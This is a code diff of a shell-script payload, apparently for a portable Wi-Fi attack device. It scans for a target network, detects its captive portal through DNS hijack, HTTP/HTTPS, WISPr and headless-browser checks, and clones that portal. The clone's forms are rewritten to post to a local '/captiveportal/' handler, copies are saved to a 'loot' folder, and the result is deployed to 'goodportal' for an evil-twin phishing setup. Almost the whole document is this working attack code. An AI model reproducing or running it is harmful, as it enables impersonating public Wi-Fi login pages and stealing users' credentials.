+                # Portal is likely at the hijacked IP
+                DNS_HIJACK_IP="$resolved"
+                return 0
+            fi
+        fi
+    done
+    
+    LOG "    No DNS hijack detected"
+    return 1
+}
+
+# Extract JavaScript-based redirects from HTML content (BusyBox compatible)
+extract_js_redirects() {
+    local html_file="$1"
+    local redirects=""
+    
+    if [ ! -f "$html_file" ]; then
+        return 1
+    fi
+    
+    # window.location patterns - use sed instead of grep -P
+    redirects=$(grep "window\.location" "$html_file" 2>/dev/null | sed -E "s/.*window\.location\s*=\s*[\"']([^\"']+)[\"'].*/\1/" | head -1)
+    [ -n "$redirects" ] && [ "$redirects" != "$(grep 'window\.location' "$html_file" 2>/dev/null | head -1)" ] && echo "$redirects" && return 0
+    
+    # location.href patterns
+    redirects=$(grep "location\.href" "$html_file" 2>/dev/null | sed -E "s/.*location\.href\s*=\s*[\"']([^\"']+)[\"'].*/\1/" | head -1)
+    [ -n "$redirects" ] && echo "$redirects" && return 0
+    
+    # location.replace patterns
+    redirects=$(grep "location\.replace" "$html_file" 2>/dev/null | sed -E "s/.*location\.replace\s*\(\s*[\"']([^\"']+)[\"'].*/\1/" | head -1)
+    [ -n "$redirects" ] && echo "$redirects" && return 0
+    
+    # Meta refresh patterns
+    redirects=$(grep -i "content=" "$html_file" 2>/dev/null | grep -i "url=" | sed -E 's/.*url=([^"'\'']+).*/\1/' | head -1)
+    [ -n "$redirects" ] && echo "$redirects" && return 0
+    
+    return 1
+}
+
+# Parse WISPr XML response for login URL (BusyBox compatible)
+parse_wispr_response() {
+    local content="$1"
+    local login_url=""
+    
+    # Check if this is a WISPr response
+    if echo "$content" | grep -qi "WISPAccessGatewayParam"; then
+        LOG "    WISPr response detected"
+        
+        # Extract LoginURL - use sed instead of grep -P
+        login_url=$(echo "$content" | grep -i "LoginURL" | sed -E 's/.*<LoginURL>([^<]+)<.*/\1/' | head -1)
+        [ -z "$login_url" ] && login_url=$(echo "$content" | grep -i "LoginURL" | sed -E 's/.*<!\[CDATA\[([^\]]+)\].*/\1/' | head -1)
+        
+        if [ -n "$login_url" ]; then
+            # Decode HTML entities
+            login_url=$(echo "$login_url" | sed 's/&amp;/\&/g; s/&lt;/</g; s/&gt;/>/g')
+            echo "$login_url"
+            return 0
+        fi
+    fi
+    
+    return 1
+}
+
+# Check for headless browser availability
+check_headless_available() {
+    if command -v phantomjs >/dev/null 2>&1; then
+        HEADLESS_TOOL="phantomjs"
+        HEADLESS_AVAILABLE=1
+        return 0
+    elif command -v chromium >/dev/null 2>&1; then
+        HEADLESS_TOOL="chromium"
+        HEADLESS_AVAILABLE=1
+        return 0
+    elif command -v playwright >/dev/null 2>&1; then
+        HEADLESS_TOOL="playwright"
+        HEADLESS_AVAILABLE=1
+        return 0
+    fi
+    
+    HEADLESS_AVAILABLE=0
+    return 1
+}
+
+# Use headless browser to render page and capture final URL/content
+headless_fetch() {
+    local url="$1"
+    local output_file="$2"
+    
+    if [ "$HEADLESS_AVAILABLE" -eq 0 ]; then
+        return 1
+    fi
+    
+    LOG "  Using headless browser ($HEADLESS_TOOL)..."
+    
+    case "$HEADLESS_TOOL" in
+        phantomjs)
+            # Create PhantomJS script
+            cat > /tmp/phantom_fetch.js << 'JSEOF'
+var page = require('webpage').create();
+var system = require('system');
+var url = system.args[1];
+var output = system.args[2];
+
+page.settings.userAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15';
+page.settings.javascriptEnabled = true;
+
+page.open(url, function(status) {
+    if (status === 'success') {
+        // Wait for JS redirects
+        setTimeout(function() {
+            var fs = require('fs');
+            fs.write(output + '.url', page.url, 'w');
+            fs.write(output, page.content, 'w');
+            phantom.exit(0);
+        }, 3000);
+    } else {
+        phantom.exit(1);
+    }
+});
+JSEOF
+            timeout 15 phantomjs /tmp/phantom_fetch.js "$url" "$output_file" 2>/dev/null
+            rm -f /tmp/phantom_fetch.js
+            ;;
+        chromium)
+            # Use chromium in headless mode
+            timeout 15 chromium --headless --disable-gpu --dump-dom "$url" > "$output_file" 2>/dev/null
+            ;;
+    esac
+    
+    [ -f "$output_file" ] && [ -s "$output_file" ]
+}
+
+# Preserve URL parameters when modifying forms
+preserve_url_params() {
+    local html_file="$1"
+    local portal_url="$2"
+    
+    # Extract query string from portal URL
+    local query_string="${portal_url#*\?}"
+    
+    if [ "$query_string" != "$portal_url" ] && [ -n "$query_string" ]; then
+        LOG "  Preserving URL parameters: $query_string"
+        
+        # Parse parameters and add as hidden fields
+        local hidden_fields=""
+        IFS='&' read -ra PARAMS <<< "$query_string"
+        for param in "${PARAMS[@]}"; do
+            local key="${param%%=*}"
+            local value="${param#*=}"
+            # URL decode value
+            value=$(printf '%b' "${value//%/\\x}")
+            hidden_fields="$hidden_fields<input type=\"hidden\" name=\"$key\" value=\"$value\">\n"
+        done
+        
+        # Insert hidden fields after form tags
+        if [ -n "$hidden_fields" ]; then
+            sed -i "s|<form\([^>]*\)>|<form\1>\n$hidden_fields|gi" "$html_file" 2>/dev/null
+        fi
+    fi
+}
+
 # =============================================================================
 # PHASE 1: SCAN FOR SSIDS
 # =============================================================================
@@ -450,14 +1566,26 @@ scan_ssids() {
             }
             print signal "|" ssid "|" bssid "|" ch
         }
-    }' | sort -t'|' -k1 -nr | head -n $MAX_SSIDS > "$TEMP_DIR/ssids.txt"
+    }' | sort -t'|' -k1 -nr | head -n $MAX_SSIDS > "$TEMP_DIR/ssids_raw.txt"
+    
+    # Apply signal strength filter
+    filter_by_signal "$TEMP_DIR/ssids_raw.txt" "$TEMP_DIR/ssids_filtered.txt"
+    
+    # Apply band filter
+    filter_by_band "$TEMP_DIR/ssids_filtered.txt" "$TEMP_DIR/ssids.txt"
     
     local ssid_count
     ssid_count=$(wc -l < "$TEMP_DIR/ssids.txt" 2>/dev/null || echo "0")
     LOG "Found $ssid_count networks"
     
     if [ "$ssid_count" -eq 0 ]; then
-        ERROR_DIALOG "No networks found!\n\nMake sure $INTERFACE is available and try again."
+        local raw_count
+        raw_count=$(wc -l < "$TEMP_DIR/ssids_raw.txt" 2>/dev/null || echo "0")
+        if [ "$raw_count" -gt 0 ]; then
+            ERROR_DIALOG "No networks match filters!\n\nFound $raw_count networks but\nall filtered out.\n\nAdjust signal/band settings."
+        else
+            ERROR_DIALOG "No networks found!\n\nMake sure $INTERFACE is available and try again."
+        fi
         return 1
     fi
     
@@ -470,17 +1598,15 @@ scan_ssids() {
 select_ssid() {
     LOG "=== SELECT TARGET NETWORK ==="
     
-    # Build selection menu
+    # Build selection menu (file-based for ash/dash compatibility)
     local menu_text="Select target network:\n\n"
     local idx=1
-    local ssids=()
-    local bssids=()
-    local channels=()
+    
+    # Create indexed file for lookup
+    > "$TEMP_DIR/ssids_indexed.txt"
     
     while IFS='|' read -r signal ssid bssid channel; do
-        ssids+=("$ssid")
-        bssids+=("$bssid")
-        channels+=("$channel")
+        echo "$idx|$ssid|$bssid|$channel" >> "$TEMP_DIR/ssids_indexed.txt"
         menu_text="${menu_text}${idx}. ${ssid} (${signal}dBm)\n"
         idx=$((idx + 1))
         if [ $idx -gt $MAX_SSIDS ]; then
@@ -510,10 +1636,12 @@ select_ssid() {
         return 1
     fi
     
-    # Store selected network info
-    TARGET_SSID="${ssids[$((selection-1))]}"
-    TARGET_BSSID="${bssids[$((selection-1))]}"
-    TARGET_CHANNEL="${channels[$((selection-1))]}"
+    # Look up selected network from indexed file (ash/dash compatible)
+    local selected_line
+    selected_line=$(grep "^${selection}|" "$TEMP_DIR/ssids_indexed.txt")
+    TARGET_SSID=$(echo "$selected_line" | cut -d'|' -f2)
+    TARGET_BSSID=$(echo "$selected_line" | cut -d'|' -f3)
+    TARGET_CHANNEL=$(echo "$selected_line" | cut -d'|' -f4)
     
     LOG "Selected: $TARGET_SSID"
     LOG "  BSSID: $TARGET_BSSID"
@@ -564,9 +1692,17 @@ EOF
     rm -rf "$WPA_CTRL" 2>/dev/null
     sleep 1
     
-    # Start wpa_supplicant
+    # Start wpa_supplicant with driver fallback
     LOG "Starting wpa_supplicant..."
-    wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -D nl80211 2>/dev/null
+    
+    # Try nl80211 first (preferred), fallback to wext if it fails
+    if ! wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -D nl80211 2>/dev/null; then
+        LOG yellow "  nl80211 driver failed, trying wext..."
+        if ! wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -D wext 2>/dev/null; then
+            LOG yellow "  wext driver failed, trying without driver spec..."
+            wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" 2>/dev/null
+        fi
+    fi
     echo $! > /tmp/clone_portal_wpa.pid
     sleep 3
     
@@ -685,7 +1821,7 @@ EOF
 }
 
 # =============================================================================
-# PHASE 4: DETECT CAPTIVE PORTAL
+# PHASE 4: DETECT CAPTIVE PORTAL (ENHANCED)
 # =============================================================================
 detect_captive_portal() {
     LOG "=== DETECTING CAPTIVE PORTAL ==="
@@ -693,69 +1829,196 @@ detect_captive_portal() {
     
     PORTAL_URL=""
     PORTAL_DETECTED=0
+    DNS_HIJACK_IP=""
     
-    LOG "Testing connectivity..."
+    # -------------------------------------------------------------------------
+    # Method 1: DNS Hijack Detection
+    # -------------------------------------------------------------------------
+    LOG "Method 1: DNS hijack detection..."
+    if detect_dns_hijack; then
+        PORTAL_URL="http://$DNS_HIJACK_IP/"
+        PORTAL_DETECTED=1
+        LOG green "  Portal likely at: $PORTAL_URL"
+    fi
     
-    for url in "${DETECTION_URLS[@]}"; do
-        LOG "  Testing: $url"
+    # -------------------------------------------------------------------------
+    # Method 2: HTTP Connectivity Check (standard method)
+    # -------------------------------------------------------------------------
+    if [ $PORTAL_DETECTED -eq 0 ]; then
+        LOG "Method 2: HTTP connectivity check..."
         
-        # Use curl to check for redirects
-        local response
-        response=$(curl -s -L -m $TIMEOUT -o /dev/null -w "%{http_code}|%{url_effective}|%{redirect_url}" "$url" 2>/dev/null)
-        
-        local http_code=$(echo "$response" | cut -d'|' -f1)
-        local final_url=$(echo "$response" | cut -d'|' -f2)
-        local redirect_url=$(echo "$response" | cut -d'|' -f3)
-        
-        LOG "    HTTP: $http_code"
-        
-        # Check for captive portal indicators
-        if [ "$http_code" = "302" ] || [ "$http_code" = "301" ] || [ "$http_code" = "307" ]; then
-            # Redirect detected - likely captive portal
-            if [ -n "$redirect_url" ]; then
-                PORTAL_URL="$redirect_url"
-            else
-                PORTAL_URL="$final_url"
-            fi
-            PORTAL_DETECTED=1
-            LOG green "  Redirect detected: $PORTAL_URL"
-            break
-        elif [ "$http_code" = "200" ]; then
-            # Check if response is expected or intercepted
-            local content
-            content=$(curl -s -m $TIMEOUT "$url" 2>/dev/null | head -c 500)
+        for url in "${DETECTION_URLS_HTTP[@]}"; do
+            LOG "  Testing: $url"
             
-            # Check for captive portal signs in response
-            if echo "$content" | grep -qiE "(login|sign.?in|connect|accept|terms|captive|portal|authenticate|wifi)"; then
-                PORTAL_URL="$url"
+            local response
+            local http_code
+            local final_url
+            local redirect_url
+            
+            response=$(curl -s -L -m $TIMEOUT -o /dev/null -w "%{http_code}|%{url_effective}|%{redirect_url}" "$url" 2>/dev/null)
+            http_code=$(echo "$response" | cut -d'|' -f1)
+            final_url=$(echo "$response" | cut -d'|' -f2)
+            redirect_url=$(echo "$response" | cut -d'|' -f3)
+            
+            LOG "    HTTP: $http_code"
+            
+            # Check for redirect
+            if [ "$http_code" = "302" ] || [ "$http_code" = "301" ] || [ "$http_code" = "307" ]; then
+                if [ -n "$redirect_url" ]; then
+                    PORTAL_URL="$redirect_url"
+                else
+                    PORTAL_URL="$final_url"
+                fi
                 PORTAL_DETECTED=1
-                LOG green "  Portal content detected"
+                LOG green "  Redirect detected: $PORTAL_URL"
+                break
+            elif [ "$http_code" = "200" ]; then
+                # Check content for portal indicators
+                local content
+                content=$(curl -s -m $TIMEOUT "$url" 2>/dev/null)
+                
+                # Check for WISPr response
+                local wispr_url
+                wispr_url=$(parse_wispr_response "$content")
+                if [ -n "$wispr_url" ]; then
+                    PORTAL_URL="$wispr_url"
+                    PORTAL_DETECTED=1
+                    LOG green "  WISPr login URL: $PORTAL_URL"
+                    break
+                fi
+                
+                # Check for portal keywords (multi-language)
+                if echo "$content" | head -c 1000 | grep -qiE "($PORTAL_KEYWORDS_ALL)"; then
+                    # Save content for JS redirect extraction
+                    echo "$content" > /tmp/portal_check.html
+                    
+                    # Check for JavaScript redirects
+                    local js_redirect
+                    js_redirect=$(extract_js_redirects /tmp/portal_check.html)
+                    if [ -n "$js_redirect" ]; then
+                        LOG green "  JS redirect found: $js_redirect"
+                        # Make relative URLs absolute
+                        if [[ "$js_redirect" =~ ^/ ]]; then
+                            local base_domain
+                            base_domain=$(echo "$url" | sed -E 's|(https?://[^/]+).*|\1|')
+                            js_redirect="${base_domain}${js_redirect}"
+                        fi
+                        PORTAL_URL="$js_redirect"
+                    else
+                        PORTAL_URL="$url"
+                    fi
+                    PORTAL_DETECTED=1
+                    LOG green "  Portal content detected"
+                    rm -f /tmp/portal_check.html
+                    break
+                fi
+            fi
+        done
+    fi
+    
+    # -------------------------------------------------------------------------
+    # Method 3: HTTPS Connectivity Check (for HTTPS-only portals)
+    # -------------------------------------------------------------------------
+    if [ $PORTAL_DETECTED -eq 0 ]; then
+        LOG "Method 3: HTTPS connectivity check..."
+        
+        for url in "${DETECTION_URLS_HTTPS[@]}"; do
+            LOG "  Testing: $url"
+            
+            local response
+            local http_code
+            local final_url
+            
+            # Note: -k to ignore cert errors (portal may have self-signed cert)
+            response=$(curl -s -k -L -m $TIMEOUT -o /dev/null -w "%{http_code}|%{url_effective}" "$url" 2>/dev/null)
+            http_code=$(echo "$response" | cut -d'|' -f1)
+            final_url=$(echo "$response" | cut -d'|' -f2)
+            
+            LOG "    HTTP: $http_code"
+            
+            if [ "$http_code" = "302" ] || [ "$http_code" = "301" ] || [ "$http_code" = "307" ]; then
+                PORTAL_URL="$final_url"
+                PORTAL_DETECTED=1
+                LOG green "  HTTPS redirect: $PORTAL_URL"
+                break
+            elif [ "$http_code" = "200" ] && [ "$final_url" != "$url" ]; then
+                # Was redirected to different URL
+                PORTAL_URL="$final_url"
+                PORTAL_DETECTED=1
+                LOG green "  HTTPS portal: $PORTAL_URL"
                 break
             fi
-        fi
-    done
+        done
+    fi
     
-    # Also try accessing the gateway directly
+    # -------------------------------------------------------------------------
+    # Method 4: Gateway Direct Access
+    # -------------------------------------------------------------------------
     if [ $PORTAL_DETECTED -eq 0 ] && [ -n "$GATEWAY" ]; then
-        LOG "  Testing gateway: http://$GATEWAY/"
+        LOG "Method 4: Gateway direct access..."
+        LOG "  Testing: http://$GATEWAY/"
         
         local gw_response
-        gw_response=$(curl -s -m $TIMEOUT "http://$GATEWAY/" 2>/dev/null | head -c 1000)
+        gw_response=$(curl -s -m $TIMEOUT "http://$GATEWAY/" 2>/dev/null)
         
         if [ -n "$gw_response" ]; then
-            if echo "$gw_response" | grep -qiE "(login|sign.?in|connect|accept|terms|captive|portal|authenticate|wifi|<form)"; then
-                PORTAL_URL="http://$GATEWAY/"
+            # Check for WISPr
+            local wispr_url
+            wispr_url=$(parse_wispr_response "$gw_response")
+            if [ -n "$wispr_url" ]; then
+                PORTAL_URL="$wispr_url"
                 PORTAL_DETECTED=1
-                LOG green "  Portal found at gateway"
+                LOG green "  WISPr at gateway: $PORTAL_URL"
+            elif echo "$gw_response" | head -c 1000 | grep -qiE "($PORTAL_KEYWORDS_ALL|<form)"; then
+                # Save and check for JS redirects
+                echo "$gw_response" > /tmp/portal_check.html
+                local js_redirect
+                js_redirect=$(extract_js_redirects /tmp/portal_check.html)
+                if [ -n "$js_redirect" ]; then
+                    if [[ "$js_redirect" =~ ^/ ]]; then
+                        js_redirect="http://$GATEWAY$js_redirect"
+                    fi
+                    PORTAL_URL="$js_redirect"
+                else
+                    PORTAL_URL="http://$GATEWAY/"
+                fi
+                PORTAL_DETECTED=1
+                LOG green "  Portal at gateway"
+                rm -f /tmp/portal_check.html
             fi
         fi
     fi
     
+    # -------------------------------------------------------------------------
+    # Method 5: Headless Browser (optional, for JS-heavy portals)
+    # -------------------------------------------------------------------------
+    if [ $PORTAL_DETECTED -eq 0 ] && [ "$USE_HEADLESS_BROWSER" -eq 1 ] && [ "$HEADLESS_AVAILABLE" -eq 1 ]; then
+        LOG "Method 5: Headless browser rendering..."
+        
+        local test_url="${DETECTION_URLS_HTTP[0]}"
+        if headless_fetch "$test_url" "/tmp/headless_result.html"; then
+            # Check if we got redirected
+            if [ -f "/tmp/headless_result.html.url" ]; then
+                local rendered_url
+                rendered_url=$(cat /tmp/headless_result.html.url)
+                if [ "$rendered_url" != "$test_url" ]; then
+                    PORTAL_URL="$rendered_url"
+                    PORTAL_DETECTED=1
+                    LOG green "  Headless detected portal: $PORTAL_URL"
+                fi
+            fi
+            rm -f /tmp/headless_result.html /tmp/headless_result.html.url
+        fi
+    fi
+    
+    # -------------------------------------------------------------------------
+    # Fallback: Manual URL Entry
+    # -------------------------------------------------------------------------
     if [ $PORTAL_DETECTED -eq 0 ]; then
-        LOG yellow "No captive portal detected"
+        LOG yellow "No captive portal detected via automatic methods"
         
         local resp
-        resp=$(CONFIRMATION_DIALOG "No captive portal detected.\n\nNetwork may have:\n- Direct internet access\n- Portal on HTTPS\n- Delayed portal\n\nTry manual URL?")
+        resp=$(CONFIRMATION_DIALOG "No captive portal detected.\n\nTried: DNS hijack, HTTP,\nHTTPS, gateway access.\n\nEnter URL manually?")
         
         case $? in
             $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
@@ -780,7 +2043,8 @@ detect_captive_portal() {
         fi
     fi
     
-    LOG "Portal URL: $PORTAL_URL"
+    LOG ""
+    LOG green "Portal URL: $PORTAL_URL"
     return 0
 }
 
@@ -808,6 +2072,18 @@ clone_portal() {
     local base_url=$(echo "$PORTAL_URL" | sed -E 's|(https?://[^/]+).*|\1|')
     LOG "Base URL: $base_url"
     
+    # Check connectivity before cloning
+    if ! check_connectivity; then
+        LOG yellow "Connection lost, attempting reconnect..."
+        if ! auto_reconnect; then
+            ERROR_DIALOG "Connection lost and\nreconnection failed."
+            return 1
+        fi
+    fi
+    
+    # Track response time for rate limiting tuning
+    track_response_time "$PORTAL_URL" >/dev/null
+    
     # Clone using wget with recursive depth
     LOG "Downloading portal pages..."
     
@@ -815,7 +2091,7 @@ clone_portal() {
     spinner_id=$(START_SPINNER "Cloning portal...")
     
     # Download main page and linked resources
-    cd "$TEMP_DIR/clone"
+    # Note: wget uses --directory-prefix so no cd needed
     
     wget --quiet \
          --recursive \
@@ -886,6 +2162,9 @@ clone_portal() {
     LOG "Modifying form actions..."
     
     find "$clone_dir" -name "*.html" -o -name "*.htm" -o -name "*.php" 2>/dev/null | while read -r file; do
+        # Preserve URL parameters as hidden fields (for Coova/ChilliSpot style portals)
+        preserve_url_params "$file" "$PORTAL_URL"
+        
         # Replace form action to point to goodportal captiveportal handler
         sed -i 's|action="[^"]*"|action="/captiveportal/"|g' "$file" 2>/dev/null
         sed -i "s|action='[^']*'|action='/captiveportal/'|g" "$file" 2>/dev/null
@@ -909,9 +2188,102 @@ EOF
     chmod -R 755 "$clone_dir"
     find "$clone_dir" -type f -exec chmod 644 {} \;
     
+    # Detect portal template
+    LOG "Detecting portal template..."
+    local index_content=""
+    if [ -f "$clone_dir/index.html" ]; then
+        index_content=$(cat "$clone_dir/index.html" 2>/dev/null)
+    elif [ -f "$clone_dir/index.php" ]; then
+        index_content=$(cat "$clone_dir/index.php" 2>/dev/null)
+    fi
+    
+    if [ -n "$index_content" ]; then
+        local template
+        template=$(detect_portal_template "$index_content")
+        if [ -n "$template" ]; then
+            LOG green "  Template: $template"
+            echo "Template: $template" >> "$clone_dir/portal_info.txt"
+        fi
+    fi
+    
+    # Take screenshot if headless browser available
+    if [ "$USE_HEADLESS_BROWSER" -eq 1 ] && [ "$HEADLESS_AVAILABLE" -eq 1 ]; then
+        LOG "Taking portal screenshot..."
+        if take_portal_screenshot "$PORTAL_URL" "$clone_dir/screenshot.png"; then
+            LOG green "  Screenshot saved"
+            cp "$clone_dir/screenshot.png" "$loot_clone_dir/" 2>/dev/null
+        fi
+    fi
+    
+    # Inline assets for offline use
+    LOG "Inlining external assets..."
+    local html_files
+    html_files=$(find "$clone_dir" -name "*.html" 2>/dev/null)
+    for hf in $html_files; do
+        inline_assets "$hf" "$base_url"
+    done
+    
+    # Verify portal
+    LOG "Verifying cloned portal..."
+    if verify_portal "$clone_dir"; then
+        LOG green "  Portal verification passed"
+    else
+        LOG yellow "  Portal may have issues (check log)"
+    fi
+    
+    # V1.3: Extended analysis
+    LOG "=== EXTENDED PORTAL ANALYSIS ==="
+    
+    # Extract SSL certificate info if HTTPS
+    if [[ "$PORTAL_URL" =~ ^https ]]; then
+        extract_ssl_cert_info "$PORTAL_URL" "$clone_dir/ssl_cert_info.txt"
+        cp "$clone_dir/ssl_cert_info.txt" "$loot_clone_dir/" 2>/dev/null
+    fi
+    
+    # Detect API endpoints
+    detect_api_endpoints "$clone_dir" "$clone_dir/api_endpoints.txt"
+    cp "$clone_dir/api_endpoints.txt" "$loot_clone_dir/" 2>/dev/null
+    
+    # Analyze form fields
+    analyze_form_fields "$clone_dir" "$clone_dir/form_analysis.txt"
+    cp "$clone_dir/form_analysis.txt" "$loot_clone_dir/" 2>/dev/null
+    
+    # Analyze cookies
+    analyze_cookies "$clone_dir/cookie_analysis.txt"
+    cp "$clone_dir/cookie_analysis.txt" "$loot_clone_dir/" 2>/dev/null
+    
+    # Check for MAC-based bypass
+    detect_mac_bypass "$PORTAL_URL"
+    
+    # Sanitize HTML (remove tracking)
+    LOG "Sanitizing HTML (removing trackers)..."
+    local sanitize_files
+    sanitize_files=$(find "$clone_dir" -name "*.html" -o -name "*.htm" 2>/dev/null)
+    for hf in $sanitize_files; do
+        sanitize_html "$hf"
+    done
+    
+    # Log response time stats
+    local avg_time
+    avg_time=$(get_avg_response_time)
+    if [ "$avg_time" -gt 0 ]; then
+        LOG "  Avg response time: ${avg_time}ms"
+        log_to_file "Average response time: ${avg_time}ms"
+    fi
+    
+    # Create archive
+    local archive_path
+    archive_path=$(create_portal_archive "$clone_dir" "$portal_name")
+    
     LOG green "Portal cloned successfully!"
     LOG "  Location: $clone_dir"
     LOG "  Backup: $loot_clone_dir"
+    if [ -n "$archive_path" ]; then
+        LOG "  Archive: $archive_path"
+    fi
+    if [ -n "$LOG_FILE" ]; then
+        LOG "  Log: $LOG_FILE"
+    fi
     
     # Store for later use
     CLONED_PORTAL_DIR="$clone_dir"
@@ -1108,6 +2480,146 @@ fi
 
 LOG ""
 
+# =============================================================================
+# OPTIONAL DEPENDENCIES
+# =============================================================================
+OPTIONAL_DEPS="openssl:openssl-util grep:grep"
+OPTIONAL_MISSING=""
+
+LOG "Checking optional dependencies..."
+for dep in $OPTIONAL_DEPS; do
+    cmd="${dep%%:*}"
+    pkg="${dep##*:}"
+    
+    if ! command -v "$cmd" >/dev/null 2>&1; then
+        LOG yellow "  Optional missing: $cmd"
+        OPTIONAL_MISSING="$OPTIONAL_MISSING $pkg"
+    else
+        LOG green "  Found: $cmd"
+    fi
+done
+
+# Check for GNU grep (needed for -P flag)
+HAVE_GNU_GREP=0
+if command -v grep >/dev/null 2>&1; then
+    if grep --version 2>/dev/null | grep -q "GNU"; then
+        HAVE_GNU_GREP=1
+        LOG green "  GNU grep available (PCRE support)"
+    else
+        LOG yellow "  BusyBox grep (limited pattern support)"
+    fi
+fi
+
+# Check for openssl
+HAVE_OPENSSL=0
+if command -v openssl >/dev/null 2>&1; then
+    HAVE_OPENSSL=1
+    LOG green "  OpenSSL available (SSL cert extraction)"
+else
+    LOG yellow "  OpenSSL missing (SSL features disabled)"
+fi
+
+# Prompt to install optional dependencies if any missing
+if [ -n "$OPTIONAL_MISSING" ]; then
+    resp=$(CONFIRMATION_DIALOG "Optional packages missing:\n$OPTIONAL_MISSING\n\nInstall for full features?\n(SSL certs, better parsing)")
+    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+        LOG "Installing optional packages..."
+        for pkg in $OPTIONAL_MISSING; do
+            LOG "  Installing $pkg..."
+            opkg install "$pkg" >/dev/null 2>&1
+            if opkg list-installed | grep -q "^${pkg} "; then
+                LOG green "    Installed: $pkg"
+            else
+                LOG yellow "    Failed: $pkg (continuing)"
+            fi
+        done
+        # Re-check capabilities
+        command -v openssl >/dev/null 2>&1 && HAVE_OPENSSL=1
+        grep --version 2>/dev/null | grep -q "GNU" && HAVE_GNU_GREP=1
+    fi
+fi
+
+LOG ""
+
+# =============================================================================
+# HEADLESS BROWSER OPTION (for JS-heavy portals)
+# =============================================================================
+check_headless_available
+if [ "$HEADLESS_AVAILABLE" -eq 1 ]; then
+    LOG "Headless browser available: $HEADLESS_TOOL"
+    resp=$(CONFIRMATION_DIALOG "Headless browser detected!\n\n$HEADLESS_TOOL is available.\n\nEnable for JS-heavy portals?\n(Slower but more thorough)")
+    case $? in
+        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
+            USE_HEADLESS_BROWSER=0
+            ;;
+    esac
+    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+        USE_HEADLESS_BROWSER=1
+        LOG green "  Headless browser enabled"
+    else
+        USE_HEADLESS_BROWSER=0
+        LOG "  Headless browser disabled"
+    fi
+else
+    LOG "Headless browser not available (optional)"
+fi
+
+LOG ""
+
+# =============================================================================
+# CONFIGURATION PERSISTENCE
+# =============================================================================
+if [ -f "$CONFIG_FILE" ]; then
+    resp=$(CONFIRMATION_DIALOG "Load saved settings?\n\nPrevious config found.")
+    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+        load_config
+        LOG green "  Settings loaded"
+    fi
+fi
+
+# =============================================================================
+# SCAN FILTER OPTIONS
+# =============================================================================
+resp=$(CONFIRMATION_DIALOG "Configure scan filters?\n\n- Signal strength filter\n- Band selection (2.4/5GHz)\n\nSkip for defaults.")
+case $? in
+    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
+        LOG "Using default scan settings"
+        ;;
+esac
+
+if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+    # Signal strength filter
+    resp=$(CONFIRMATION_DIALOG "Filter weak signals?\n\nHide networks weaker than\n-85 dBm (very weak)")
+    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+        FILTER_WEAK_SIGNALS=1
+        LOG green "  Weak signal filter enabled"
+    fi
+    
+    # Band selection
+    LOG "Band selection..."
+    resp=$(CONFIRMATION_DIALOG "Scan 2.4GHz only?\n\n(Better range, more networks)")
+    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+        BAND_FILTER="2.4"
+        LOG green "  2.4GHz only"
+    else
+        resp=$(CONFIRMATION_DIALOG "Scan 5GHz only?\n\n(Faster, less interference)")
+        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+            BAND_FILTER="5"
+            LOG green "  5GHz only"
+        else
+            BAND_FILTER="all"
+            LOG "  All bands"
+        fi
+    fi
+fi
+
+LOG ""
+
+# Initialize logging
+init_logging
+log_to_file "Configuration: Interface=$INTERFACE, Band=$BAND_FILTER, WeakFilter=$FILTER_WEAK_SIGNALS"
+log_to_file "User Agent: ${CURRENT_USER_AGENT:-rotating}"
+
 # Save original interface state before modifying
 save_interface_state
 
@@ -1204,6 +2716,28 @@ LOG ""
 LOG "Portal saved to:"
 LOG "  $CLONED_PORTAL_DIR"
 LOG ""
+
+# =============================================================================
+# SAVE CONFIGURATION
+# =============================================================================
+resp=$(CONFIRMATION_DIALOG "Save current settings?\n\nBand: $BAND_FILTER\nSignal filter: $FILTER_WEAK_SIGNALS\n\nReuse next time.")
+if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+    save_config
+    LOG green "  Settings saved"
+fi
+
+# =============================================================================
+# GOODPORTAL INTEGRATION
+# =============================================================================
+resp=$(CONFIRMATION_DIALOG "Deploy to goodportal?\n\nCopy portal to /www/portals\nfor immediate use with\ngoodportal_configure.")
+if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+    if integrate_with_goodportal "$CLONED_PORTAL_DIR" "$CLONED_PORTAL_NAME"; then
+        LOG green "Portal deployed to goodportal!"
+        LOG "  Run 'goodportal Configure' to start serving"
+    else
+        LOG yellow "Goodportal integration had issues"
+    fi
+fi
 
 # =============================================================================
 # PHASE 7: DEPLOYMENT OPTIONS
